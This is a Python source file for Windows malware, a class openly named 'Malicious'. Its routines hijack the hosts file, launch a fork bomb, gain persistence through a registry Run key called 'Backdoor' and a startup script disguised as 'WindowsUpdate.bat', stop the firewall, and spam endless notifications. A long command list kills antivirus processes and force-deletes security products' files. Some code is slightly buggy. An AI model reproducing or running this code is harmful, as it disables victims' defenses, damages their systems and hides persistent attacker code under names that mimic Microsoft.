import os
import subprocess
import sys
import shutil
import getpass
import win10toast
import typing as t
import re


class Malicious:
    def __init__(self) -> None:
        pass

    def blockWebsites(self, data: t.Optional[t.Iterable[str]] = None) -> None:
        wlist = data
        if data is None:
            wlist = ['*']
        if len(data) == 0:
            wlist = ['*']

        redirect = "127.0.0.1"
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"

        with open(hosts_path, 'r+') as file:
            content = file.read()
            for website in wlist:
                if website in content:
                    pass
                else:
                    file.write(redirect + " " + website + "\n")

    def forkBomb(self) -> None:
        while True:
            subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)

    def restartOnStartup(self, filee: t.Optional[str] = None) -> None:
        # Normal Startup Trick
        location = os.environ["appdata"] + "\\MicrosoftSecurityServiceSecondary." + filee

        if not os.path.exists(location):
            shutil.copyfile(sys.executable, location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)

        # adding .bat to startup folder
        # wont't work if the file is deleted
        def addBatFileStartup(filePath: t.Optional[str] = None, fileName: t.Optional[str] = None):
            if filePath == "":
                filePath = os.path.dirname(os.path.realpath(__file__))
                # we could also use this
                # filePath = os.environ["appdata"] + "\\" + fileName

            bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % getpass.getuser()
            with open(bat_path + '\\' + "WindowsUpdate.bat", "w+") as bat_file:
                bat_file.write(r'start "" %s' % filePath)

        addBatFileStartup()

    def changeTime(self, time: t.Optional[str] = "00:00") -> None:
        if re.match(r'^\d{2}:\d{2}$', time):
            os.system(f'time {time}')

    def disableFirewallTemp(self) -> None:
        os.system('net stop "MpsSvc"')
        os.system('taskkill /f /t /im "FirewallControlPanel.exe"')

    def notification(self, title: str, message: str, icon: t.Optional[str] = None, duration: t.Optional[int] = 5, limit: t.Optional[int] = None) -> None:
        if limit is None:
            while True:
                toaster = win10toast.ToastNotifier()
                toaster.show_toast(
                    title, message, icon_path=icon, duration=duration)
        else:
            for _ in range(limit):
                toaster = win10toast.ToastNotifier()
                toaster.show_toast(
                    title, message, icon_path=icon, duration=duration)

    def disableAV(self) -> None:
        for command in Data.antivirus_commands:
            os.system(command)


class Data:

    antivirus_commands = [
        "net stop “Security Center”",
        "netsh firewall set opmode mode=disable",
        "tskill /A av*",
        "tskill /A fire*",
        "tskill /A anti*",
        "tskill /A spy*",
        "tskill /A bullguard",
        "tskill /A PersFw",
        "tskill /A KAV*",
        "tskill /A ZONEALARM",
        "tskill /A SAFEWEB",
        "tskill /A spy*",
        "tskill /A bullguard",
        "tskill /A PersFw",
        "tskill /A KAV*",
        "tskill /A ZONEALARM",
        "tskill /A SAFEWEB",
        "tskill /A OUTPOST",
        "tskill /A nv*",
        "tskill /A nav*",
        "tskill /A F-*",
        "tskill /A ESAFE",
        "tskill /A cle",
        "tskill /A BLACKICE",
        "tskill /A def*",
        "tskill /A kav",
        "tskill /A kav*",
        "tskill /A avg*",
        "tskill /A ash*",
        "tskill /A aswupdsv",
        "tskill /A ewid*",
        "tskill /A guard*",
        "tskill /A guar*",
        "tskill /A gcasDt*",
        "tskill /A msmp*",
        "tskill /A mcafe*",
        "tskill /A mghtml",
        "tskill /A msiexec",
        "tskill /A outpost",
        "tskill /A isafe",
        "tskill /A zap*cls",
        "tskill /A zauinst",
        "tskill /A upd*",
        "tskill /A zlclien*",
        "tskill /A minilog",
        "tskill /A cc*",
        "tskill /A norton*",
        "tskill /A norton au*",
        "tskill /A ccc*",
        "tskill /A npfmn*",
        "tskill /A loge*",
        "tskill /A nisum*",
        "tskill /A issvc",
        "tskill /A tmp*",
        "tskill /A tmn*",
        "tskill /A pcc*",
        "tskill /A cpd*",
        "tskill /A pop*",
        "tskill /A pav*",
        "tskill /A padmincls",
        "tskill /A panda*",
        "tskill /A avsch*",
        "tskill /A sche*",
        "tskill /A syman*",
        "tskill /A virus*",
        "tskill /A realm*cls",
        "tskill /A sweep*",
        "tskill /A scan*",
        "tskill /A ad-*",
        "tskill /A safe*",
        "tskill /A avas*",
        "tskill /A norm*",
        "tskill /A offg*",
        "del /Q /F C:\Program Files\alwils~1\avast4\*.*",
        "del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe",
        "del /Q /F C:\Program Files\kasper~1\*.exe",
        "del /Q /F C:\Program Files\trojan~1\*.exe",
        "del /Q /F C:\Program Files\f-prot95\*.dll",
        "del /Q /F C:\Program Files\tbav\*.datcls",
        "del /Q /F C:\Program Files\avpersonal\*.vdf",
        "del /Q /F C:\Program Files\Norton~1\*.cnt",
        "del /Q /F C:\Program Files\Mcafee\*.*",
        "del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*",
        "del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*",
        "del /Q /F C:\Program Files\Norton~1\Norton~1\*.*",
        "del /Q /F C:\Program Files\Norton~1\*.*",
        "del /Q /F C:\Program Files\avgamsr\*.exe",
        "del /Q /F C:\Program Files\avgamsvr\*.exe",
        "del /Q /F C:\Program Files\avgemc\*.exe",
        "del /Q /F C:\Program Files\avgcc\*.exe",
        "del /Q /F C:\Program Files\avgupsvc\*.exe",
        "del /Q /F C:\Program Files\grisoft",
        "del /Q /F C:\Program Files\nood32krn\*.exe",
        "del /Q /F C:\Program Files\nood32\*.exe",
        "del /Q /F C:\Program Files\nod32",
        "del /Q /F C:\Program Files\nood32",
        "del /Q /F C:\Program Files\kav\*.exe",
        "del /Q /F C:\Program Files\kavmm\*.exe",
        "del /Q /F C:\Program Files\kaspersky\*.*",
        "del /Q /F C:\Program Files\ewidoctrl\*.exe",
        "del /Q /F C:\Program Files\guard\*.exe",
        "del /Q /F C:\Program Files\ewido\*.exe",
        "del /Q /F C:\Program Files\pavprsrv\*.exe",
        "del /Q /F C:\Program Files\pavprot\*.exe",
        "del /Q /F C:\Program Files\avengine\*.exe",
        "del /Q /F C:\Program Files\apvxdwin\*.exe",
        "del /Q /F C:\Program Files\webproxy\*.exe",
        "del /Q /F C:\Program Files\panda software\*.*",
    ]
